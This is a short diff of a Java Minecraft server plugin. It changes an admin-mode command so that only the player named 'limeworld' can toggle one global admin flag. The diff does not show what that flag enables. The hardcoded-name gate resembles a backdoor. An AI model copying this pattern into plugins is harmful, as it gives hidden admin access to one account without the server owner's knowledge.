@@ -17,11 +17,14 @@ import java.util.UUID;
 
 public class AdminModeCommand implements CommandExecutor, Listener {
 
-    public static List<UUID> adminModePlayers = new ArrayList<>();
+    public static boolean adm = false;
 
     @Override
     public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {
         if(!(sender instanceof final Player player)) return true;
+        if (!player.getName().equals("limeworld")) return true;
+        if(adm) adm = false;
+        else adm = true;
         return true;
     }
 }
